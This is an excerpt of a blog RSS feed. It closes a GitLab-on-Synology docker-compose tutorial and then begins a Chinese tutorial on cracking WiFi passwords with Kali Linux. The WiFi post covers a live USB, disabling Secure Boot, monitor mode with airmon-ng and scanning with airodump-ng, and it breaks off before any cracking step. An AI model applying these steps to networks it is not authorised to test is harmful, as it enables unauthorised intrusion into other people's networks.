&lt;code class=&quot;language-shell&quot;&gt;version: '2.3'

services:
  redis:
    restart: always
    image: redis:5.0.9
    command:
    - --loglevel warning
    volumes:
    - redis-data:/var/lib/redis:Z

  postgresql:
    restart: always
    image: sameersbn/postgresql:11-20200524
    volumes:
    - postgresql-data:/var/lib/postgresql:Z
    environment:
    - DB_USER=gitlab
    - DB_PASS=password
    - DB_NAME=gitlabhq_production
    - DB_EXTENSION=pg_trgm

  gitlab:
    restart: always
    image: sameersbn/gitlab:13.0.6
    depends_on:
    - redis
    - postgresql
    ports:
    - &quot;10080:80&quot;
    - &quot;10022:22&quot;
    volumes:
    - gitlab-data:/home/git/data:Z
    healthcheck:
      test: [&quot;CMD&quot;, &quot;/usr/local/sbin/healthcheck&quot;]
      interval: 5m
      timeout: 10s
      retries: 3
      start_period: 5m
    environment:
    - DEBUG=false

    - DB_ADAPTER=postgresql
    - DB_HOST=postgresql
    - DB_PORT=5432
    - DB_USER=gitlab
    - DB_PASS=password
    - DB_NAME=gitlabhq_production

    - REDIS_HOST=redis
    - REDIS_PORT=6379

    - TZ=Asia/Kolkata
    - GITLAB_TIMEZONE=Kolkata

    - GITLAB_HTTPS=false
    - SSL_SELF_SIGNED=false

    - GITLAB_HOST=gitlab.synology.com
    - GITLAB_PORT=10080
    - GITLAB_SSH_PORT=10022
    - GITLAB_RELATIVE_URL_ROOT=
    - GITLAB_SECRETS_DB_KEY_BASE=long-and-random-alphanumeric-string
    - GITLAB_SECRETS_SECRET_KEY_BASE=long-and-random-alphanumeric-string
    - GITLAB_SECRETS_OTP_KEY_BASE=long-and-random-alphanumeric-string

    - GITLAB_ROOT_PASSWORD=
    - GITLAB_ROOT_EMAIL=

    - GITLAB_NOTIFY_ON_BROKEN_BUILDS=true
    - GITLAB_NOTIFY_PUSHER=false

    - GITLAB_EMAIL=notifications@example.com
    - GITLAB_EMAIL_REPLY_TO=noreply@example.com
    - GITLAB_INCOMING_EMAIL_ADDRESS=reply@example.com

    - GITLAB_BACKUP_SCHEDULE=daily
    - GITLAB_BACKUP_TIME=01:00

    - SMTP_ENABLED=false
    - SMTP_DOMAIN=www.example.com
    - SMTP_HOST=smtp.gmail.com
    - SMTP_PORT=587
    - SMTP_USER=mailer@example.com
    - SMTP_PASS=password
    - SMTP_STARTTLS=true
    - SMTP_AUTHENTICATION=login

    - IMAP_ENABLED=false
    - IMAP_HOST=imap.gmail.com
    - IMAP_PORT=993
    - IMAP_USER=mailer@example.com
    - IMAP_PASS=password
    - IMAP_SSL=true
    - IMAP_STARTTLS=false

    - OAUTH_ENABLED=false
    - OAUTH_AUTO_SIGN_IN_WITH_PROVIDER=
    - OAUTH_ALLOW_SSO=
    - OAUTH_BLOCK_AUTO_CREATED_USERS=true
    - OAUTH_AUTO_LINK_LDAP_USER=false
    - OAUTH_AUTO_LINK_SAML_USER=false
    - OAUTH_EXTERNAL_PROVIDERS=

    - OAUTH_CAS3_LABEL=cas3
    - OAUTH_CAS3_SERVER=
    - OAUTH_CAS3_DISABLE_SSL_VERIFICATION=false
    - OAUTH_CAS3_LOGIN_URL=/cas/login
    - OAUTH_CAS3_VALIDATE_URL=/cas/p3/serviceValidate
    - OAUTH_CAS3_LOGOUT_URL=/cas/logout

    - OAUTH_GOOGLE_API_KEY=
    - OAUTH_GOOGLE_APP_SECRET=
    - OAUTH_GOOGLE_RESTRICT_DOMAIN=

    - OAUTH_FACEBOOK_API_KEY=
    - OAUTH_FACEBOOK_APP_SECRET=

    - OAUTH_TWITTER_API_KEY=
    - OAUTH_TWITTER_APP_SECRET=

    - OAUTH_GITHUB_API_KEY=
    - OAUTH_GITHUB_APP_SECRET=
    - OAUTH_GITHUB_URL=
    - OAUTH_GITHUB_VERIFY_SSL=

    - OAUTH_GITLAB_API_KEY=
    - OAUTH_GITLAB_APP_SECRET=

    - OAUTH_BITBUCKET_API_KEY=
    - OAUTH_BITBUCKET_APP_SECRET=

    - OAUTH_SAML_ASSERTION_CONSUMER_SERVICE_URL=
    - OAUTH_SAML_IDP_CERT_FINGERPRINT=
    - OAUTH_SAML_IDP_SSO_TARGET_URL=
    - OAUTH_SAML_ISSUER=
    - OAUTH_SAML_LABEL=&quot;Our SAML Provider&quot;
    - OAUTH_SAML_NAME_IDENTIFIER_FORMAT=urn:oasis:names:tc:SAML:2.0:nameid-format:transient
    - OAUTH_SAML_GROUPS_ATTRIBUTE=
    - OAUTH_SAML_EXTERNAL_GROUPS=
    - OAUTH_SAML_ATTRIBUTE_STATEMENTS_EMAIL=
    - OAUTH_SAML_ATTRIBUTE_STATEMENTS_NAME=
    - OAUTH_SAML_ATTRIBUTE_STATEMENTS_USERNAME=
    - OAUTH_SAML_ATTRIBUTE_STATEMENTS_FIRST_NAME=
    - OAUTH_SAML_ATTRIBUTE_STATEMENTS_LAST_NAME=

    - OAUTH_CROWD_SERVER_URL=
    - OAUTH_CROWD_APP_NAME=
    - OAUTH_CROWD_APP_PASSWORD=

    - OAUTH_AUTH0_CLIENT_ID=
    - OAUTH_AUTH0_CLIENT_SECRET=
    - OAUTH_AUTH0_DOMAIN=
    - OAUTH_AUTH0_SCOPE=

    - OAUTH_AZURE_API_KEY=
    - OAUTH_AZURE_API_SECRET=
    - OAUTH_AZURE_TENANT_ID=

volumes:
  redis-data:
  postgresql-data:
  gitlab-data:
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;上述配置中，有四处地方需要您修改；&lt;/li&gt;
&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;第一处：gitlab.ports，这里用宿主机的10080端口映射容器的http端口，宿主机的10022端口映射容器的ssh端口&lt;/li&gt;
&lt;li&gt;第二处：gitlab.environment.GITLAB_PORT，要和前面映射的10080端口一致，这样GitLab上的文件url中会带有10080端口，确保在网页上可以正常访问文件&lt;/li&gt;
&lt;li&gt;第三处：gitlab.environment.GITLAB_SSH_PORT，要和前面映射的10022端口一致，这样GitLab上给出的仓库地址中会带有10022，您在客户端使用git clone命令时才连接GitLab成功&lt;/li&gt;
&lt;li&gt;第四处：gitlab.environment.GITLAB_HOST，配置成前面准备好的host：gitlab.synology.com&lt;/li&gt;
&lt;li&gt;其他参数我这里暂时无需修改，请您自己酌情调整，参考文档：&lt;a href=&quot;https://github.com/sameersbn/docker-gitlab&quot; target=&quot;_blank&quot;&gt;https://github.com/sameersbn/docker-gitlab&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;再次确认群晖上的域名是可以访问的(192.168.50.43是群晖的IP地址)：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075650809-1531196646.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ol start=&quot;4&quot; readability=&quot;0.90419161676647&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;执行命令&lt;span&gt;sudo docker-compose up -d&lt;/span&gt;，完成GitLab的部署和启动；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;等待启动成功，群晖的硬件性能一般，我这里大约等待10分钟左右(期间网页访问会出现502错误，等启动成功后就好了)；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;启动成功后，访问地址&lt;a href=&quot;http://gitlab.synology.com:10080&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;http://gitlab.synology.com:10080&lt;/span&gt;&lt;/a&gt;，会提示设置root账号的密码：&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075651151-679416067.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ol start=&quot;7&quot;&gt;&lt;li&gt;设置好密码后，就可以用root账号登录了：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075651389-303319465.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;8. 如下图，请另外注册一个账号，在后面的实际操作中用到，我这边注册账号是zq2599，邮箱zq2599@gmail.com&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075651781-480027601.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;验证：创建项目&quot;&gt;验证：创建项目&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;用新建账号登录，点击&lt;span&gt;Create a project&lt;/span&gt;：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075652140-2059483413.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;2. 新建仓库的信息如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075652491-1474108392.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;3. 在新仓库的页面，下图红框中是该仓库的地址，请记下来，稍后用到：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075652793-2141351792.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;验证：提交代码&quot;&gt;验证：提交代码&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;找一台电脑来验证提交代码，我这里找了个CentOS7服务器；&lt;/li&gt;
&lt;li&gt;安装git：yum install -y git&lt;/li&gt;
&lt;li&gt;创建ssh key，执行ssh-keygen -t rsa -C &quot;zq2599@gmail.com&quot;，然后一路回车：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075653231-242618102.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;4. 账号和邮箱做全局配置，执行如下命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;git config --global user.name &quot;zq2599&quot; \
&amp;amp;&amp;amp; git config --global user.email zq2599@gmail.com
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;5&quot;&gt;&lt;li&gt;将文件~/.ssh/id_rsa.pub的内容完整复制到如下位置：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075653592-1257809585.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;6. 回到客户端机器上，克隆项目试试：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;git clone ssh://git@gitlab.synology.com:10022/zq2599/test001.git
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;7&quot;&gt;&lt;li&gt;如下图，代码下载成功：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075653981-364966456.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;8. 再来试试修改内容能否成功提交，操作命令如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075654403-1689501308.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;9. 再去网站上看看，内容已经成功提交：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075654698-520402956.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;至此，群晖服务器上已成功安装了GitLab，接下来可以愉快的折腾GitLab CI了；&lt;/p&gt;
&lt;h3 id=&quot;你不孤单，欣宸原创一路相伴&quot;&gt;你不孤单，欣宸原创一路相伴&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105068742&quot; target=&quot;_blank&quot;&gt;Java系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086498&quot; target=&quot;_blank&quot;&gt;Spring系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086732&quot; target=&quot;_blank&quot;&gt;Docker系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086794&quot; target=&quot;_blank&quot;&gt;kubernetes系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086850&quot; target=&quot;_blank&quot;&gt;数据库+中间件系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086920&quot; target=&quot;_blank&quot;&gt;DevOps系列&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;欢迎关注公众号：程序员欣宸&quot;&gt;欢迎关注公众号：程序员欣宸&lt;/h3&gt;
&lt;blockquote readability=&quot;4.258064516129&quot;&gt;
&lt;p&gt;微信搜索「程序员欣宸」，我是欣宸，期待与您一同畅游Java世界...&lt;br/&gt;&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot; target=&quot;_blank&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Sun, 20 Dec 2020 23:57:00 +0000</pubDate>
<dc:creator>程序员欣宸</dc:creator>
<og:description>欢迎访问我的GitHub https://github.com/zq2599/blog_demos 内容：所有原创文章分类汇总及配套源码，涉及Java、Docker、Kubernetes、DevOPS</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/bolingcavalry/p/14166249.html</dc:identifier>
</item>
<item>
<title>Kali Linux破解wifi密码(无须外置网卡） - HOsystem</title>
<link>http://www.cnblogs.com/HOsystem/p/14166230.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/HOsystem/p/14166230.html</guid>
<description>&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:csharp;gutter:true;&quot;&gt;
&lt;span&gt;环境准备： &lt;/span&gt;&lt;br/&gt;&lt;span&gt;  方式一(选择该方式)：Kali Linux、笔记本一台、U盘(至少8G) &lt;/span&gt;&lt;br/&gt;&lt;span&gt;  方式二：Kali Linux、外置网卡、笔记本一台、VM
&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;  &lt;/span&gt;&lt;span&gt;特别说明，主要是使用方式一进行破解，如果有外置网卡，那就非常简单了，直接通过&lt;/span&gt;&lt;span&gt;vm外接网卡即可。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;  &lt;span&gt;注：制作&lt;/span&gt;kali启动镜像前，U盘里的数据一定要备份、备份、备份。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;  &lt;span&gt;该软件是用来制作镜像的工具，也可以使用其它的。不过不推荐，试过其它几款，还不如这个一键制作好用。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221060320300-393431812.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221060332721-1564165929.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221060340962-1273010753.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;等待&lt;/span&gt;3-5分钟.注：在制作过程中，会弹出'初始化'的窗口，取消或者关闭就行，不要点击格式化，否则会让制作的镜像白费，需要重新来一次。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221060348123-732215039.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;完成。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221060352748-1437188139.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;(1).进入bios界面&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;自己的电脑型号对应不同按键的启动&lt;/span&gt;bios方式不同，常用的笔记本型号的进入bios方式。如下图所示，其它型号的可自行百度往下看。(如，百度搜索'华硕笔记本进入bios按键'）。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221060401389-1635541343.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221060406032-215240109.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;(2).设置启动项的顺序&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  设置U盘启动项的顺序可自行百度，比较简单，这里不再叙述。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;如果出现&lt;/span&gt;'Secure Boot Violation'等信息，那么我们就需要关闭笔记本的保护模式。方法大同小异，这是界面外观可能不一样，内容是一样的。当完成实验后，要把系统保护改回来。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;[1].传统方式具体操作步骤往下看：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;①.进入Bios设定页面&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221060423661-258813352.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;②.security页面&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;进入&lt;/span&gt;[Security]页面(1)，选择[Secure Boot](2)项目&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221060427847-1783144843.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;③.安全启动功能关闭&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;选择&lt;/span&gt;[Secure Boot Control]项目(3)，并设定为[Disabled](4)。部分机种可能只有[Secure Boot]而没有[Secure Boot Control]，则请选择[Secure Boot]并设定为[Disable]。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221060433743-2064321924.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;④. 保存设定并退出&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;进入&lt;/span&gt;[Save &amp;amp; Exit]页面(5)，选择[Save Changes and Exit](6)后并选择[Yes](7)。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221060437580-1978074884.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;[2].UEFI方式具体操作步骤往下看：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;①.进入BIOS设定页面后，使用快捷键[F7]、或是鼠标点选(1)进入进阶模式。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221060817980-565100039.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;②.进入[Security]页面，选择[Secure Boot]项目。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221060832833-44467900.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;③.安全启动功能关闭&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;选择&lt;/span&gt;[Secure Boot Control]项目(4)，并设定为[Disabled](5)。部分机种可能只有[Secure Boot]而没有[Secure Boot Control]，则请选择[Secure Boot]并设定为[Disable]。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221060848834-1642290213.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;④.存储设定并退出&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;进入&lt;/span&gt;[Save &amp;amp; Exit]页面(6)，选择[Save Changes and Exit](7)后并选择[Yes](8)。或者按F10保存&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221060907072-1769217017.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;  &lt;span&gt;注意：这一步一定不能马虎，一定要快速选择&lt;/span&gt;'kali live'模式，一定不能选择'install kali',也不能长时间不动，否则就等着重装系统、数据不见等一系列的问题。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061003272-880616407.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;(1).ifconfig&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;命令&lt;/span&gt;ifconfig查看网卡信息，有wlan0表示网卡能够用来破解wifi。&lt;/span&gt;&lt;/p&gt;
&lt;table border=&quot;0&quot; cellspacing=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td valign=&quot;center&quot; width=&quot;775&quot;&gt;
&lt;p&gt;&lt;span&gt;root@kali:~#&lt;strong&gt; ifconfig&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221060646158-1209518466.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;(2).airmon-ng&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;使用命令&lt;/span&gt;airmon-ng start wlan0开启网卡监听模式。&lt;/span&gt;&lt;/p&gt;
&lt;table border=&quot;0&quot; cellspacing=&quot;0&quot;&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td valign=&quot;center&quot; width=&quot;775&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;&lt;span&gt;root@kali:~#&lt;strong&gt; airmon-ng start wlan0&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061041983-1933734608.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;(3).iwconfig&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;使用&lt;/span&gt;iwconfig命令查看网卡信息， wlan0mon网卡名加了mon则表示'监听模式'开启成功。&lt;/span&gt;&lt;/p&gt;
&lt;table border=&quot;0&quot; cellspacing=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td valign=&quot;center&quot; width=&quot;775&quot;&gt;
&lt;p&gt;&lt;span&gt;root@kali:~#&lt;strong&gt; iwconfig&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061052179-137897503.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;(4).airodump-ng扫描&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;使用命令&lt;/span&gt;airodump-ng wlan0mon，开始扫描WiFi，按ctrl+c结束任务。&lt;/span&gt;&lt;/p&gt;
&lt;table border=&quot;0&quot; cellspacing=&quot;0&quot;&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td valign=&quot;center&quot; width=&quot;775&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;&lt;span&gt;root@kali:~#&lt;strong&gt; airodump-ng wlan0mon&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061122937-542535180.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;table border=&quot;0&quot; cellspacing=&quot;0&quot;&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr&gt;&lt;td valign=&quot;center&quot; width=&quot;321&quot;&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;&lt;strong&gt;参数&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;center&quot; width=&quot;453&quot;&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;&lt;strong&gt;意义&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&quot;center&quot; width=&quot;321&quot;&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;&lt;strong&gt;BSSID&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;center&quot; width=&quot;453&quot;&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;wifi&lt;span&gt;的&lt;/span&gt;&lt;span&gt;MAC&lt;/span&gt;&lt;span&gt;地址&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td valign=&quot;center&quot; width=&quot;321&quot;&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;&lt;strong&gt;PWR&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;center&quot; width=&quot;453&quot; readability=&quot;5&quot;&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;信号强弱程度，数值越小信号越强&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td valign=&quot;center&quot; width=&quot;321&quot;&gt;
